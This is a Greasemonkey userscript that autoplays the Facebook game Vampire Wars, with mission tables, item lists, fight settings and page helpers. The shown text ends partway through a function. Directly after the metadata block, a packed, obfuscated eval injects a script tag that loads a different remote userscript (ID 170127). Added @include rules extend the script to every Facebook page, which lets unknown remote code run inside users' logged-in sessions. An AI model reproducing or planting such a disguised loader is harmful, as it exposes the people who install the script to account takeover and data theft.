// ==UserScript==
// @name		VampireWars2 Plus
// @namespace		Facebook
// @description		Autoplayer for the Vampire Wars game
// @version		2.7.20
// @include		http://apps.facebook.com/vampiresgame/*
// @include		http://apps.new.facebook.com/vampiresgame/*
// @include		http://facebook6.vampires.zynga.com/*
// @include		http://www.facebook.com/connect/uiserver*
// @exclude		http://apps.facebook.com/vampiresgame/*index.php?cache_hash=*
// @exclude		http://facebook6.vampires.zynga.com/*index.php?cache_hash=*
// @exclude		http://apps.facebook.com/vampiresgame/*index.php?sendbuffkey=*
// @exclude		http://facebook6.vampires.zynga.com/*index.php?sendbuffkey=*
// @exclude		http://apps.facebook.com/vampiresgame/*index.php?sendStwKey=*
// @exclude		http://facebook6.vampires.zynga.com/*index.php?sendStwKey=*
// @exclude		http://apps.facebook.com/vampiresgame/*index.php?zy_track=*
// @exclude		http://facebook6.vampires.zynga.com/*index.php?zy_track=*
// @exclude		http://apps.facebook.com/vampiresgame/*landing.php?zy_track=recruit*
// @exclude		http://facebook6.vampires.zynga.com/*landing.php?zy_track=recruit*
// @exclude		http://apps.facebook.com/vampiresgame/*track.php*
// @exclude		http://facebook6.vampires.zynga.com/*track.php*
// @exclude		http://apps.facebook.com/vampiresgame/*hits.php*
// @exclude		http://facebook6.vampires.zynga.com/*hits.php*
// @exclude		http://apps.facebook.com/vampiresgame/*comments.php*
// @exclude		http://facebook6.vampires.zynga.com/*comments.php*
// @exclude		http://apps.facebook.com/vampiresgame/*stats.php?user=*
// @exclude		http://facebook6.vampires.zynga.com/*stats.php?user=*
// @exclude		http://apps.facebook.com/vampiresgame/*jobs.php?helpSocial=*
// @exclude		http://facebook6.vampires.zynga.com/*jobs.php?helpSocial=*
// @exclude		http://facebook6.vampires.zynga.com/*xd_receiver.htm*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @exclude		http://facebook6.vampires.zynga.com/*cookie_monster.php*
// @exclude		http://facebook6.vampires.zynga.com/zmc/button.php*
// @author 		blannie
// @contributor		IEF
// @contributor		Zorkfour (G.L. Cadogan)
// @contributor		doc
// @contributor 	Mozbrad 
// @contributor 	zysfryar 
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))



//Edit 032910 (zysfryar): Added Lines 8 thru 19 - zysfryar: reasons for exclude do the following, without
//initiating the auto-play and let it run in another tab/window. You can accept items from Newsfeed
//or provide assistance You can accept gifts, Use the Hitlist without being empacted. Use the Comments pages
//View other members Pages for commenting, voting, or attack & bite, hitlist or Send gifts.

// 2011_04_09-2.7.20a_vampirewars2.user.js

var settingsOpen = false;
var logOpen      = true;
if (isGMUndefined('advConfigDelay')) {
	var delay = 3000;
} else {
	var delay = GM_getValue('advConfigDelay', 3000);
}
var debug = true;
var advConfigActive = true;

// Initialize the array of vamps I have lost to if necessary
if (isGMUndefined('autoFightLossList')) {
	var autoFightLossList = new Array();
	setSavedList('autoFightLossList', autoFightLossList);
} else {
	var autoFightLossList = GM_getValue('autoFightLossList');
}
//alert('autoFightLossList= '+autoFightLossList);

// Initialize the array of vamps I have lost to in the Arena if necessary
if (isGMUndefined('autoFightArenaLossList')) {
	var autoFightArenaLossList = new Array();
	setSavedList('autoFightArenaLossList', autoFightArenaLossList);
} else {
	var autoFightArenaLossList = GM_getValue('autoFightArenaLossList');
}
//alert('autoFightArenaLossList= '+autoFightArenaLossList);


if (isGMUndefined('autoFightGoodTargetsList')) {
	var autoFightGoodTargetsList = new Array();
	setSavedList('autoFightGoodTargetsList', autoFightGoodTargetsList);
} else {
	var autoFightGoodTargetsList = GM_getValue('autoFightGoodTargetsList');
}
//alert('autoFightGoodTargetsList= '+autoFightGoodTargetsList);

// Initialize the array of judged vamps if necessary
if (isGMUndefined('clanJudgedList')) {
	GM_setValue('clanJudgedList', '');
}
//alert('clanJudgedList= '+GM_getValue('clanJudgedList'));
var clanJudgedArrayMaxSize = 1000;
var clanJudgeInterval = 24*60*60*1000; // 1 day in milliseconds



// Avoidance of fighting for known tough opponents (fightListAvoid) and clan members (mySelectClanAvoid)
var fightListAvoid = new Array(
	123456789,  // Put a comma separated list of IDs you want to avoid here - you can put comments after them so you know who they are.
	234567890   // Make sure the last one in the list doesn't have a comma after it.
);

var mySelectClanAvoid = new Array(
	345678901,  // Put a comma separated list of IDs who are in your clan so you won't bother trying to fight them.
	456789012   //  Make sure the last one in the list doesn't have a comma after it.
);

// Avoidance of fighting for known tough opponents (fightListAvoid) and clan members (mySelectClanAvoid)
fightListAvoid = fightListAvoid.concat(mySelectClanAvoid);
// Automatically add to avoid list vamps I have lost to 
fightListAvoidStd = fightListAvoid.concat(autoFightLossList);
var blacklist = fightListAvoidStd.toString();
fightListAvoidArena = fightListAvoid.concat(autoFightArenaLossList);
var blacklistArena = fightListAvoidArena.toString();
//alert('blacklist= '+blacklist);


var SCRIPT = {
	url: 'http://userscripts.org/scripts/show/64049',
	sourceurl: 'http://userscripts.org/scripts/source/64049.user.js',
	version: '2.7.20',
	name: 'vampiresgame',
	gameurl: 'http://facebook6.vampires.zynga.com/',
	appID: 'app25287267406',
	appNo: '25287267406',
	presentationurl: 'http://userscripts.org/scripts/show/64049',
	metadata: 'http://userscripts.org/scripts/source/64049.meta.js'
};


var gvar=function() {} // Global variables

// Handle Publishing
function checkInPublishPopup() {
//  if (xpathFirst('.//div[contains(@class,"aid_' + SCRIPT.appNo +'")]') && /prompt_feed/.test(window.location.href))  {
//  if (xpathFirst('.//div[contains(@class,"aid_' + SCRIPT.appNo +'")]'))  {





  if (xpathFirst('//div[contains(@class,"aid_' + SCRIPT.appNo +'")]') &&
      /connect\/uiserver/.test(window.location.href)) {
    setGMTime('postTimer', '00:10');
    window.setTimeout(handlePublishing, 900);
    return true;
  }
  return false;
}

function fetchPubOptions() {
  copyVWValues(['autoPublishLimitTimeT1toT2', 'autoPublishLimitTimeT1Time', 'autoPublishLimitTimeT2Time', 
                'autoPublishLimitTimeT3toT4', 'autoPublishLimitTimeT3Time', 'autoPublishLimitTimeT4Time',
                'autoPublishLimitRandom', 'autoPublishLimitRandomPercent',
                'autoPublishBloodMagic', 'autoPublishMissionAssistance', 'autoPublishFightKill',
                'autoPublishPromoMinion', 'autoPublishLevelUp', 'autoPublishCollectorBox']);
}


// Load the iframe
function checkLoadIframe() {
  //var iFrameCanvas = xpathFirst('//iframe[@name="vampirewars"]');
  //if (iFrameCanvas) {
  //  setFBParams();
  //  window.location.replace(iFrameCanvas.src);
  //  return true;
  //}
  //return false;
	if (document.getElementById('blueBar')) {
		//Thanks to spockholm & 'Chris' for the unframe code
		for (var i = 0; i < document.forms.length; i++) {
			if (/^canvas_iframe_post/.test(document.forms[i].id)) {
				document.forms[i].target = '';
				document.forms[i].submit();
				return false;
			}
      			// setFBParams();
		}
	}
	
//	} else {
//		document.body.parentNode.style.overflowY="scroll";
//		document.body.style.overflowX="auto";
//		document.body.style.overflowY="auto";
//	}

}


// Animate functions - borrowed from MWAP
function Animate() {
  this.TOUT = null;
  this.desc = '';
  this.fx = null;
  this.delay = null;
}

Animate.prototype.clearTimeout = function() {
  if (this.TOUT) {
    log('Clearing ' + this.desc + ' timer ' + this.TOUT + '.');
    clearTimeout(this.TOUT);
    this.TOUT = null;
  }
}

Animate.prototype.setTimeout = function(fx, delay) {
  this.clearTimeout();
  this.fx = fx;
  this.delay = delay;
  // Make the handler clear TOUT. This prevents attempts
  // to clear timers that have already gone off.

  var obj = this;
  this.TOUT = window.setTimeout(function () { if (obj) obj.TOUT = null; fx(); }, delay);
  log('Started ' + this.desc + ' timer ' + this.TOUT +
        ', delay=' + delay/1000 + ' sec.');
}

Animate.prototype.start = function() {
  if ((GM_getValue('paused')==0) && settingsOpen === false && this.fx) {
    this.setTimeout(this.fx, this.delay);
  } else if (settingsOpen === true) {
    log('Settings box open. Not starting ' + this.desc + ' timer.');
  } else {
    log('Autoplayer paused. Not starting ' + this.desc + ' timer.');
  }
}


var level;
var clan;
var td;
var blood;
var health;
var energy;
var maxenergy;
var rage;
var maxrage;
var bankpopup;
var bank;
var bankvalue;
var lottery;
var gameVersion;
var EnergyBuffGain;
var JudgeTimerIndex;


if (isGMUndefined('activeMagicRefreshInterval')) {
	var activeMagicRefreshInterval = '10:00';
} else {
	var activeMagicRefreshInterval = GM_getValue('activeMagicRefreshInterval', '10:00');
}

if (isGMUndefined('goToIndexInterval')) {
	var goToIndexInterval = '15:00';
} else {
	var goToIndexInterval = GM_getValue('goToIndexInterval', '15:00');
}

if (isGMUndefined('goToStatsInterval')) {
	var goToStatsInterval = '30:00';
} else {
	var goToStatsInterval = GM_getValue('goToStatsInterval', '30:00');
}

var goToBookmarkURLInterval = '8:1:00';
var goToCryptURLInterval = '24:1:00';

var missions = new Array(
//Mission Name, Energy , Tab, Order on Tab, Job Number

  //Fledgling currentTier=0
  ["Feast on a Human's Blood",1,0,0,1],
  ["Eliminate a Street Gang",5,0,1,2],
  ["Raid a Blood Bank",5,0,2,3],
  ["Destroy a Renegade Vampire",3,0,3,4],
  ["Kill a Drug Dealer",3,0,4,5],
  ["Fight a Sewer Wererat",2,0,5,6],
  ["Rescue an Ally From an Insane Asylum",4,0,6,7],

  //Neophyte currentTier=1
  ["Fight Ghouls in the Deep Woods",3,1,0,8],
  ["Destroy a Circle of Warlocks",3,1,1,9],
  ["Attack a Vampiric Lair",8,1,2,12],
  ["Feed in Central Park",8,1,3,11],
  ["Tame a Shadow Demon",3,1,4,10],
  ["Sneak into Vampires' Nest",5,1,5,13],
  ["Fight a Vampire Slayer",5,1,6,14],
  ["End the Unlife of a Lich",5,1,7,15],

  //Adept currentTier=2
  ["Challenge a Haitian Voodoo Gang",6,2,0,16],
  ["Fight a Pack of Werewolves",10,2,1,17],
  ["Retrieve a Lost Relic From the High Desert",7,2,2,18],
  ["Fight Another Vampire For Mental Dominance",8,2,3,19],
  ["Take Control of a Neighborhood",14,2,4,20],
  ["Save a Vampire From Hunters",10,2,5,21],
  ["Clear a Laboratory of Hideous Mutants",13,2,6,22],

  //Savant currentTier=3
  ["Battle a Werewolf Lord",15,3,0,23],
  ["Rescue an Ally from the Underworld",15,3,1,24],
  ["Fight Government Agents in Foundry",18,3,2,25],
  ["Banish Summoned Demon",19,3,3,26],
  ["Face a Rival Clan Alone",20,3,4,27],
  ["Destroy a Demonic Lord",20,3,5,28],
  ["Exterminate A Rival Clan",21,3,6,29],

  //Stalker currentTier=4
  ["Research the Spider Queen's Lair",35,4,0,43],
  ["Travel through the Moonlit Forest",28,4,1,44],
  ["Uncover the Spider Caverns",37,4,2,45], 
  ["Eliminate the Spider Guards",39,4,3,46],
  ["Locate the Queen's Nest",40,4,4,47],
  ["Slay the Spider Queen",45,4,5,48],
  ["Imbibe the Spider Queen's blood",42,4,6,49],
  ["Demolish the Spider Caverns",46,4,7,50],

  //Deathbringer currentTier=5
  ["Foresee a Traitor in the Midst",38,5,0,30],
  ["Interrogate a Traitorous Minion",35,5,1,31],
  ["Investigate the Lair of Acanthus",33,5,2,32],
  ["Create a Diversion",42,5,3,33],
  ["Assault Acanthus's Lair",45,5,4,34],
  ["Stand-Off with Acanthus",50,5,5,35],

  //Vindicator currentTier=6
  ["Uncover Draven's Catacombs",42,6,0,36],
  ["Navigate the Labyrinth",38,6,1,37],
  ["Investigate the Chapel",45,6,2,38],
  ["Clear the Rotting Meat Locker",52,6,3,39],
  ["Meet with Lord Draven",50,6,4,40],
  ["Uncover the Truth",54,6,5,41],
  ["Dispense with Lord Draven",59,6,6,42],

  //Scion currentTier=7
  ["Receive The Shadow Council's Request",45,7,0,51],
  ["Travel to the Council Ruins",40,7,1,52],
  ["Meet with the Council's Emissary",52,7,2,53],
  ["The Shadow Council's Challenge",60,7,3,54],
  ["Heir to the Council",50,7,4,55],
  ["Prepare the Altar",52,7,5,56],
  ["Summon the Shadow Council",58,7,6,57],
  ["Ascend to the Shadow Council",63,7,7,58],

  //Reaper currentTier=8
  ["Retrieve the Long-lost Map",54,8,0,270],
  ["Travel to the Cave Mouth",48,8,1,271],
  ["Eviscerate the Gatekeeper",62,8,2,272],
  ["Dive into the Abyss",72,8,3,273],
  ["Call upon the Elders",60,8,4,274],
  ["Accept their Challenge",62,8,5,275],
  ["Multiply your Abilities",70,8,6,276],
  ["Become the Reaper",74,8,7,277],

  //Nightshade currentTier=9
  ["Journey through dimensional rift",68,9,0,308],
  ["Investigate planeshifters",58,9,1,309],
  ["Fend off ambush by blighted planeshifters",74,9,2,310],
  ["Infiltrate Oelebeth’s stronghold",86,9,3,311],
  ["Vanquish Oelebeth",102,9,4,312],
  ["Find the blightstone",72,9,5,313],
  ["Destroy blightstone",105,9,6,314],
  ["Seal the dimensional rift",88,9,7,315]
  );


var missionTabs = new Array(
  ["Fledgling"],
  ["Neophyte"],
  ["Adept"],
  ["Savant"],
  ["Stalker"],
  ["Deathbringer"],
  ["Vindicator"],
  ["Scion"],
  ["Reaper"],
  ["Nightshade"]
);

var autoChestDescrips  = ["Exp","Blood","50% Rage Boost","50% Energy Boost","Purple Devil's Hide","Red Devil's Hide","Black Devil's Hide","Holy Water ","Wooden Stake","Coffin Nails","Wolfsbane","Grave Dirt","Garlic Clove","Werewolf Claw","Silver Bullet","Chupacabra Teeth","Charon's Obol","Tarot Death Card","Pentagram Shard","Map Fragment","Unholy Water","Ankh Shard","Poisonwood Leaves","Pompeii Ash","Raven Feathers"];
var autoChestPrios     = ['autoChestExpPrio','autoChestBloodPrio','autoChest50RageBoostPrio','autoChest50EnergyBoostPrio','autoChestPurpleHidePrio','autoChestRedHidePrio','autoChestBlackHidePrio','autoChestHolyWaterPrio','autoChestWoodenStakePrio','autoChestCoffinNailsPrio','autoChestWolfsbanePrio','autoChestGraveDirtPrio','autoChestGarlicClovePrio','autoChestWerewolfClawPrio','autoChestSilverBulletPrio','autoChestChupacabraTeethPrio','autoChestCharonsObolPrio','autoChestTarotDeathCardPrio','autoChestPentagramShardPrio','autoChestMapFragmentPrio','autoChestUnholyWaterPrio','autoChestAnkhShardPrio','autoChestPoisonwoodLeavesPrio','autoChestPompeiiAshPrio','autoChestRavenFeathersPrio'];

//var collectorItems = new Array(
//  ["Event Item",1,"event"],
//  ["Devil's Hide",2,"P"],
//  ["50% Energy Boost",3,"A"],
//  ["50% Rage Boost",4,"H"],
//  ["50% Health Boost",5,"I"],
//  ["Chupacabra Teeth", 6,"B"],
//  ["Pentagram Shard",7,"C"],
//  ["Charon's Obol",8,"D"],
//  ["Tarot Death Card",9,"E"]
//);

var collectorItems = new Array(
  ["Devil's Hide",1,"P"],
  ["50% Energy Boost",2,"A"],
  ["50% Rage Boost",3,"H"],
  ["50% Health Boost",4,"I"],
  ["Chupacabra Teeth", 5,"B"],
  ["Pentagram Shard",6,"C"],
  ["Charon's Obol",7,"D"],
  ["Tarot Death Card",8,"E"],
  ["Holy Water",9,"F"]
);



// Automate Special Events
// Event: Dublin (Spring 2010)
var eventMissions = new Array(
//Mission Name, Energy , Tab, Order on Tab, Job Number, Number of Event Resources Required (put 0 if resources are not required for event)

  //"Higher Learning" currentEventTier=0
  ["Fly to Dublin",2,0,0,278,2],
  ["Scout Out Trinity College",3,0,1,279,2],
  ["Approach a Student",4,0,2,280,2],
  ["Feast on Young Blood",5,0,3,281,3],
  ["Rush to the Cathedral",6,0,4,282,3],

  //"Murder in the Cathedral" currentEventTier=1
  ["Enter the Cathedral",3,1,0,283,2],
  ["Hide in the Shadows",4,1,1,284,2],
  ["Ascertain the Body's Identity",5,1,2,285,3],
  ["Follow the Tracks",6,1,3,286,3],
  ["Head toward the Zoo",7,1,4,287,3],

  //"Tiger, Tiger, Burning Bright" currentEventTier=2
  ["Search for Christof and Celia's Child",3,2,0,288,2],
  ["Find the Tiger Shelter",4,2,1,289,3],
  ["Play with the Tiger Cubs",5,2,2,290,3],
  ["Confront the Tigress about the Child",6,2,3,291,3],
  ["Interpret Her Message",7,2,4,292,4],

  //"Water Ripples" currentEventTier=3
  ["Mesmerize the Bystanders",4,3,0,293,4],
  ["Stand on Top of the Ha'Penny Bridge",5,3,1,294,4],
  ["Spill a Drop of Your Blood to Summon the Giant",6,3,2,295,4],
  ["Destroy the Child's Empty Basket",7,3,3,296,5],
  ["Annihilate the Giant",8,3,4,297,5],

  //"Here Lies Evil" currentEventTier=4
  ["Step Back as Evil Balor Appears",5,4,0,298,4],
  ["Learn of Christof's Mission",6,4,1,299,4],
  ["Beware of Balor's Deceitful Eye",7,4,2,300,5],
  ["Pluck Out Balor's Eye",8,4,3,301,5],
  ["Rush to the Dublin Pub",9,4,4,302,5],

  //"Hell Hath No Fury..." currentEventTier=5
  ["Pay Your Respects to Morrigan",6,5,0,303,4],
  ["Learn the Truth about Christof's Death",7,5,1,304,5],
  ["Begin Forceful Negotiations for the Child",8,5,2,305,5],
  ["Destroy the Bartender with Balor's Eye",9,5,3,306,5],
  ["Rush to Recover the Child",10,5,4,307,6]
  );

var eventMissionTabs = new Array(
  ["Chapter 1: Higher Learning"],
  ["Chapter 2: Murder in the Cathedral"],
  ["Chapter 3: Tiger, Tiger, Burning Bright"],
  ["Chapter 4: Water Ripples"],
  ["Chapter 5: Here Lies Evil"],
  ["Chapter 6: Hell Hath No Fury..."]
);

// Automate Special Events


var eventActive = true;
if (isGMUndefined('eventActiveOverride')) {
	var eventActive = true;
} else {
	if (GM_getValue('eventActiveOverride', '') == "checked")
		var eventActive = true;
//	else
//		var eventActive = false;
}

var eventImageHTML = "<img src='http://facebook6.vampires.static.zynga.com/graphics/consume/shamrock_leaf.png' width='31' height='31' align='middle'/>"
//var eventWaypoint = "eventhome.php"
var eventWaypoint = "event.php?event=Dublin"
var eventJobsPage = "eventjobs.php"
var eventName = "Dublin"
var eventResetPage = "eventjobs.php?eventMasteryReset=1&currentTier="
var eventHasResource = true;
var eventNumResources;

// String functions borrowed from MWAP
  String.prototype.trim = function() {
    return this.replace(/^\s+|\s+$/g, '');
  }
  String.prototype.ltrim = function() {
    return this.replace(/^\s+/, '');
  }
  String.prototype.rtrim = function() {
    return this.replace(/\s+$/, '');
  }
  String.prototype.untag = function() {
    return this.replace(/<[^>]*>/g, '');
  }
  String.prototype.clean = function() {
    return this.replace(/<\/?[^>]+(>|$)/g, '');
  }


// Limit number of repeated attacks on same vamp in fight
// Initialize the array of recent attack targets if necessary
if (isGMUndefined('autoFightAttackLimitList')) {
	GM_getValue('autoFightAttackLimitList');
	var autoFightAttackLimitList = new Array();
	setSavedList('autoFightAttackLimitList', autoFightAttackLimitList);
}
//alert('autoFightAttackLimitList= '+GM_getValue('autoFightAttackLimitList'));


// Initialize VW Bookmark Bonus URL timer
if(isGMUndefined('goToBookmarkURLInterval')) {
	log('Initializing goToBookmarkURLInterval');
	//addToLog('Initializing goToBookmarkURLInterval');
	setGMTime('goToBookmarkURLInterval', '00:00');
}

// Initialize Crypt URL timer
if(isGMUndefined('goToCryptURLInterval')) {
	log('Initializing goToCryptURLInterval');
	//addToLog('Initializing goToCryptURLInterval');
	setGMTime('goToCryptURLInterval', '00:00');
}


	
var attributes	= new Array(
	["Animalistic Frenzy",4,0],
	["Astral Projection",116,1],
	["Bat Form",15,0],
	["Bile Spew",207,1],
	["Black Devil's Hide",308,1],
	["Blood Shield",26,1],
	["Blood Soaked Vengeance",208,1],
	["Blood to Ashes",5,1],
	["Bloodletting",129,1],
	["Bloody Mess",34,1],
	["Bone Spikes",14,1],
	["Cat's Grace",31,1],
	["Cause Madness",3,1],
	["Claws of the Demon",19,1],
	["Clown Frenzy",209,1],
	["Command Rat Swarm",1,1],
	["Contortionist",273,1],
	["Control Bear Clans",30,1],
	["Control Clowns",271,1],
	["Control Mall Santas",37,1],
	["Control Spider Swarm",263,1],
	["Corrosion",115,1],
	["Create Chaos",303,1],
	["Create Illusion",24,1],
	["Cross Running Water",132,1],
	["Crowd Control",220,1],
	["Demon Summoning",21,1],
	["Demonic Familiar",32,1],
	["Dodge Daylight",35,1],
	["Doppelganger",275,1],
	["Drain Youth",7,1],
	["Eagle Eyes",29,1],
	["Epic Mummification",211,1],
	["Epic Teleportation",231,1],
	["Exsanguinate",38,1],
	["Fast Healing",9,0],
	["Fatal Lullaby",280,1],
	["Flight",17,0],
	["Frost Touch",236,1],
	["Glamor",45,0],
	["Greater Crowd Control",221,1],
	["Greater Strength of Kings",224,1],
	["Greater Summon Taxi Drivers",218,1],
	["Hades' Smoke",248,1],
	["Heat Vision",149,1],
	["Hierophant Form",206,1],
	["Horrific Transformation",8,0],
	["Hyde's Rage",203,1],
	["Immaterial",23,1],
	["Immunity to Religious Icons",13,1],
	["Impervious",10,0],
	["Indestructible",18,1],
	["Inhuman Speed",11,0],
	["Insatiable Thirst",41,1],
	["Intimidation",46,0],
	["Intoxicating Bite",2,1],
	["Iron Skin",16,1],
	["Ironic Annihilation",33,1],
	["Jaguar's Grace",125,1],
	["Lion Tamer",274,1],
	["Locust Swarm",42,1],
	["Mind Control",6,0],
	["Mortify",124,1],
	["Move Silently",47,0],
	["Organ Relocation",201,1],
	["Paralysis",267,1],
	["Pestilence",27,1],
	["Phoenix's Flame",278,1],
	["Possess Doll",276,1],
	["Precision",272,1],
	["Premonition",130,1],
	["Purge Blood",22,1],
	["Purple Devil's Hide",309,1],
	["Pyrokinesis",44,1],
	["Rain of Blood",328,1],
	["Raven Spy",43,1],
	["Red Devil's Hide",310,1],
	["Resist Fire",283,1],
	["Sense Aura",285,1],
	["Sense Life",286,1],
	["Shadow Conceal",131,1],
	["Spider Climb",119,1],
	["Storm Rage",120,1],
	["Strength of Kings",223,1],
	["Summon Death",293,1],
	["Summon Famine",292,1],
	["Summon Horseman",25,1],
	["Summon Pale Horse",117,1],
	["Summon Succubus",195,1],
	["Summon Taxi Drivers",217,1],
	["Summon The Conqueror",290,1],
	["Summon War",291,1],
	["Summon Yeti",237,1],
	["Superhuman Tracking",270,1],
	["Superior Crowd Control",222,1],
	["Superior Strength of Kings",225,1],
	["Superior Summon Taxi Drivers",219,1],
	["Telepathy",12,1],
	["Unholy Incantation",145,1],
	["Vampire Lord",20,1],
	["Veil of Thorns",114,1],
	["Winged Guard",39,1],
	["Wolf Form",7,0]
	);
	
var ratings = new Array(["Tasty (+2)"],["Tempting (+1)"],["Toxic (-1)"] );


var GWStrOptions = new Array(["0%"],["20%"],["50%"],["100%"] );
var GGStrOptions = new Array(["0%"],["50%"],["100%"],["200%"] );


// Old Coffin:
//	[["Free Gifts",null],["News",null],["Stats",UpdateStats],["Comments",UpdateComments],["Edit Avatar",null], ["Trophies",null],["Judgement",JudgePeople]], // Coffin

//	[["News",null],["Stats",UpdateStats],["Trophies",null],["Avatar",null],["Comments",UpdateComments],["Judgment",JudgePeople]], // Coffin
//	[["Council",null],["Akem's Gamble",DoAkemsGamble],["Blood Magic",DoBloodMagic],["Crypt",null],["Collector",DoCollector],["Artisans",null],["Elders' Retreat ",DoRetreat]], //Elders

var menuItems = new Array(
	[["Free Gifts",null]], // Free Gifts
	[["News",null],["Stats",UpdateStats],["Trophies",null],["Avatar",null],["Comments",UpdateComments],["Judgment",JudgePeople],["Collections",null]], // Coffin
	[["Invite",DoClanAccepts],["My Clan",null],["Clan Comment",UpdateGroupWall]], // Clan
	[["Fledgling",DoMissions],["Neophyte",DoMissions],["Adept",DoMissions],["Savant",DoMissions],["Stalker",DoMissions],["Deathbringer",DoMissions],["Vindicator",DoMissions],["Scion",DoMissions],["Reaper",DoMissions],["Nightshade",DoMissions]], //Mission 
	[["Fight",DoFights],["Hitlist",null],["Leaderboards",null],["Arena",DoArena]], // Combat
	[["Abilities",UpdateAbilityPage],["Minions",UpdateMinionPage],["Shop",null]], // Bazaar
	[["Council",null],["Akem's Gamble",DoAkemsGamble],["Blood Magic",DoBloodMagic],["Crypt",null],["Collector",DoCollector],["Artisans",null],["Elders' Retreat ",DoRetreat]], //Elders
	[["Terms",null],["Forum",null],["Support",null]], //Help
	[["Stats",UpdatePlayerPage],["Comments",UpdatePlayerCommentPage]], //Help
	[["Chapter 1: Casino Macabre",DoEventMissions],["Chapter 2: Vampire Roulette",DoEventMissions],["Chapter 3: Long Live the King",DoEventMissions],["More Chapters...",null]], //Akem's World Missions (1st screen)
	[["Chapters 1 to 3",null],["Chapter 4: Smoke and Mirrors",DoEventMissions],["Chapter 5: To the Races",DoEventMissions],["Chapter 6: Dead Man's Hand",DoEventMissions]] //Akem's World Missions (2nd screen)
);

var XMLHttpFactories = [
    function () {return new XMLHttpRequest()},
    function () {return new ActiveXObject("Msxml2.XMLHTTP")},
    function () {return new ActiveXObject("Msxml3.XMLHTTP")},
    function () {return new ActiveXObject("Microsoft.XMLHTTP")}
];

String.prototype.toInt = function(){ return parseInt(this.replace(/,/g, ''));}

function getPositionLeft(This){
var el = This;var pL = 0;
while(el){pL+=el.offsetLeft;el=el.offsetParent;}
return pL
}

function getPositionTop(This){
var el = This;var pT = 0;
while(el){pT+=el.offsetTop;el=el.offsetParent;}
return pT
}
var giftbox = 'data:image/gif;base64,R0lGODlhFgAWAPcAAI6BgnBiZJWIilpNUIJwdId1eqOUmFdJTV9SVraqrnpnbq2fpMC1uWZUW7CgplZHTWdWXV9QVsW7v1hFTmFQWFpIUV1LVI10g11FVZd3joptgnZMbE8zSEwyRl8/V1k7UnRRbGxDY1I1TF8/WFA1Sn5VdamMo3ZEbVQzTls4VGxEZFMwTXtJc4hZgHVObodbgIhfgZBnio9qimAsWl0vV0cWQk8bSnhCc3dFcqN1n0sUR0kVRVEbTWYqYmMqX3c4c3lLdohchSoCKDEDL0EFPkMHQEUIQikGJ0kLRnEwbX42e4VAgWMwYbCArkYAREIAQEEAPzIAMTEAMDcBNkUDQ1gGVkgFRkQFQj8FPT0FOz0GPDsGOUQLQlIOUEsNSUQMQmwlaoBAfmIAYWEAYVYAVT4APkMBQmEGYVIFUUoFSUsJS3QQdG4TbmwYa2AbYIApf3gnd4AugIs8ip9NnqxtrOfS52sAbWIAZWEAYloAW1EAUk0ATkoAS0QARnMCdmQCZUkCSlkDWlcGWVEHUoIchHgae5Etk5k3nHMqdJQ9lY07jpJClKUArp4Ap5UAnI8Al44AlIwAk4EAh38AhHIAdnEAdW0Ac2gAbWUAamQAaVwAYKIBq3kBf3cBe2sBb5UCnY0ClGUCaXUDeoYGjXcFfVQEV58Ip2gGbJoKoX8Ig3wJgZALlpMMmmwKcIoNj6EVp3gQfYYSi48clYcsjLA6tqM5qZlHnKUAsJ8ArLE0uqwOurkyxstz07SxrHpybYV6eV1RUX1tbWNXV2xfX2ZaWmVZWWldXWFWVmBVVV9UVFhOToh5eX9xcXZpaXVoaHNmZmxgYGtfX1pQUIN1dYFzc3ptbXFlZW9jY2dcXGZbW1xSUlVMTH1wcGleXlZNTYt9fYR3d3dra2NZWVlQUFFJSYh7e4Z5eVdPT5aJiZ6RkYJ3d5OHh6mdnaaampyRkZuQkJqPj56Tk6ecnJ+VlZ2Tk7OpqbaursW9vb21tcO8vMC5ubu0tMrDw8nCwuXi4v///yH5BAEAAP8ALAAAAAAWABYAAAj/AP8JHEiQYCNJlwoqXMhoE6U+CyMKFCUJj5QoEh2BGhXrx5tXqzABUgNLYidIkThRCrVn0iZPgvyoMjRHoQs9d9zgABOoDB9LmjKlcoXK1CdZOQQ+U+Djy5EhW6YIKfWI1ClEQWLIUERnwbd/14YFoIEmT6tZQOAwosVrly5ctUysC8YMLDRsO6B00bCv15Jbuer4a7JmzAlqzcL9w5bNmI0nNYBFUxeH1SET8y60+cNiGrSB2pCtMKPjmLQDSUBcEJAuA5szIbqdGyhN2wMsXCwkG4DAl7x27WBU4TFBGrKByY5V0JKFhDZtwn6xiwdghpMU3bCJGyiumAUsWTp4ovMmDBy6cgR6kFHhbBhBYtgoGCHCwRs5bczQ0TOgRMyGatcQJI4xDSBxhQjjbJMMAPXYk4AcdpRAjTMEHUMMBF5Y8YE22yADzz36MLBIJS8sYw1BwCQTgRdpeCCMMsi8w08+EtjSSQvcYKMQBkVQMUI3yQjzTj80JmLHDRIVMggK3QiTDT394ONAGIRINBATyBwTTTz4uFOAlQppk40560gUEAA7';

function filterNotifications(elt) {
  // Get all beeps (pop-ups about notifications).
  var beeps = document.evaluate(".//div[@class=\'UIBeep_Title\']", elt, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
  for (var i = 0; i < beeps.snapshotLength; i++) {
    var beepElt = beeps.snapshotItem(i);
    if (beepElt && beepElt.innerHTML.indexOf('You sent a notification')) {
      // A notification was sent.
      if ((beepElt.innerHTML.indexOf('fought you')!=-1) || (beepElt.innerHTML.indexOf('fought with your help')!=-1)) {
        var undoElt = document.evaluate(".//a[@class=\'undo_link\']", beepElt, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null).snapshotItem(0);
        
        if (undoElt) {
          clickElement(undoElt);
          addToLog('Canceled attack notification.');
        }
      }
    }
  }
}

function showIfUnchecked(setting) {
  if (setting == '0') {
    setting = 'unchecked';
  }
  return setting;
}

function showIfSelected(setting) {
  if (setting == '0') {
    setting = 'not selected';
  } else {
    setting = 'selected';
  }
  return setting;
}

function clickElement(elt) {
  if (!elt) {
    addToLog('BUG DETECTED: Null element passed to clickElement().');
    return;
  }
  // Simulate a mouse click on the element.
  var evt = document.createEvent('MouseEvents');
